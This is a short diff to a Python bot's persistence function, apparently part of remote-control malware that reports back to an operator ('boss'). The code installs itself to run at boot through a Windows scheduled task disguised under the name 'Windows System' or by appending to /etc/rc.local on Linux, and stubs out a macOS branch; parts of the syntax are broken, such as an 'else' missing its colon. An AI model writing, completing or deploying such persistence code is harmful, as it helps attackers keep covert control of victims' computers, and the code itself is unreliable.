@@ -221,19 +221,23 @@ def reboot(): #reboot the computer
 		execute("init 6")
 
 def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/etc/rc.d/
+	script = os.getcwd() + "\\" + argv[0]
 	if operatingSystem == "windows":
 		# sendData("I'm on windows boss...")
-		script = os.getcwd() + "\\" + argv[0]
 		output = execute("schtasks /Create /SC ONSTART /TN 'Windows System' /TR " + script)
 		sendData(output)
+		return
+	elif operatingSystem == "darwin": #if mac
+		#looking into launchd and launchctl. ugh! why did they get rid of cron? stupid xmls
 		return
 	else
 		if operatingSystem == "linux": #if linux
 			path = "/etc/rc.local"
-		elif operatingSystem == "darwin": #if mac
-			sendData("don't know how to do that on mac yet.")
+		# elif operatingSystem == "freebsd": #if freebsd
+			# pass
+		else:
+			sendData("don't know the os...")
 			return
-			else
 
 		if os.access(path, os.W_OK): #check if we have write perms
 			outfile = open(path, 'a')
